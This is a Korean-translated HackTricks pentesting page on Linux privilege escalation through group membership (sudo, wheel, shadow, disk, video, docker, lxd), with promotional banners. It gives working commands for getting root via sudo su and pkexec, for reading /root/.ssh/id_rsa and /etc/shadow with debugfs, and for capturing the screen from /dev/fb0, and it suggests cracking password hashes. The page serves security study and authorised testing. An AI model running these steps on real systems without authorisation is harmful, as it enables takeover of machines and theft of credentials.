{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

# Sudo/Admin Groups

## **PE - Method 1**

**때때로**, **기본적으로 \(또는 일부 소프트웨어가 필요하기 때문에\)** **/etc/sudoers** 파일 안에서 다음과 같은 줄을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이것은 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있음을 의미합니다**.

이 경우, **root가 되려면 다음을 실행하면 됩니다**:
```text
sudo su
```
## PE - Method 2

모든 suid 바이너리를 찾아보고 **Pkexec** 바이너리가 있는지 확인하십시오:
```bash
find / -perm -4000 2>/dev/null
```
만약 pkexec 바이너리가 SUID 바이너리이고 당신이 sudo 또는 admin 그룹에 속한다면, pkexec를 사용하여 sudo로 바이너리를 실행할 수 있을 것입니다. 다음 내용을 확인하세요:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
여기에서 어떤 그룹이 **pkexec**를 실행할 수 있는지 확인할 수 있으며, **기본적으로** 일부 리눅스에서는 **sudo 또는 admin** 그룹이 **나타날 수 있습니다**.

**루트가 되려면 다음을 실행할 수 있습니다**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
만약 **pkexec**를 실행하려고 시도했는데 이 **오류**가 발생한다면:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없어서가 아니라 GUI 없이 연결되어 있지 않기 때문입니다**. 이 문제에 대한 해결 방법은 여기에서 확인할 수 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **2개의 서로 다른 ssh 세션**이 필요합니다:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

# Wheel Group

**때때로**, **기본적으로** **/etc/sudoers** 파일 안에서 이 줄을 찾을 수 있습니다:
```text
%wheel	ALL=(ALL:ALL) ALL
```
이것은 **wheel 그룹에 속한 모든 사용자가 sudo로 모든 것을 실행할 수 있음을 의미합니다**.

이 경우, **root가 되려면 다음을 실행하면 됩니다**:
```text
sudo su
```
# Shadow Group

**shadow** 그룹의 사용자들은 **/etc/shadow** 파일을 **읽을** 수 있습니다:
```text
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

# Disk Group

이 권한은 거의 **루트 접근과 동등**하며, 머신 내부의 모든 데이터에 접근할 수 있습니다.

Files:`/dev/sd[a-z][1-9]`
```text
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Note that using debugfs you can also **write files**. For example to copy `/tmp/asd1.txt` to `/tmp/asd2.txt` you can do:  
디버그 파일 시스템(debugfs)을 사용하면 **파일을 쓸 수** 있다는 점에 유의하세요. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 할 수 있습니다:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
그러나 **root가 소유한 파일** \(예: `/etc/shadow` 또는 `/etc/passwd`\)에 **쓰기**를 시도하면 "**Permission denied**" 오류가 발생합니다.

# 비디오 그룹

`w` 명령어를 사용하면 **시스템에 로그인한 사람**을 찾을 수 있으며, 다음과 같은 출력을 보여줍니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
The **tty1**는 사용자 **yossi가 물리적으로** 머신의 터미널에 로그인했음을 의미합니다.

**video group**은 화면 출력을 볼 수 있는 권한이 있습니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 **현재 화면의 이미지를** 원시 데이터로 가져오고 화면이 사용하는 해상도를 알아야 합니다. 화면 데이터는 `/dev/fb0`에 저장할 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 찾을 수 있습니다.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**원시 이미지**를 **열기** 위해 **GIMP**를 사용하고 **`screen.raw`** 파일을 선택한 후 파일 형식으로 **원시 이미지 데이터**를 선택할 수 있습니다:

![](../../.gitbook/assets/image%20%28208%29.png)

그런 다음 너비와 높이를 화면에서 사용된 값으로 수정하고 다양한 이미지 유형을 확인한 후 (화면을 더 잘 보여주는 것을 선택합니다):

![](../../.gitbook/assets/image%20%28295%29.png)

# 루트 그룹

기본적으로 **루트 그룹의 구성원**은 **서비스** 구성 파일이나 일부 **라이브러리** 파일 또는 권한 상승에 사용할 수 있는 **기타 흥미로운 것들**을 **수정**할 수 있는 접근 권한이 있는 것 같습니다...

**루트 구성원이 수정할 수 있는 파일 확인**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
# Docker Group

호스트 머신의 루트 파일 시스템을 인스턴스의 볼륨에 마운트할 수 있으므로, 인스턴스가 시작될 때 즉시 해당 볼륨에 `chroot`를 로드합니다. 이는 사실상 머신에서 루트를 제공하는 것입니다.

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

# lxc/lxd Group

[lxc - Privilege Escalation](lxd-privilege-escalation.md)


<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection)를 사용하여 세계에서 **가장 진보된** 커뮤니티 도구로 **워크플로우**를 쉽게 구축하고 **자동화**하세요.\
지금 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 **팔로우**하세요.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}
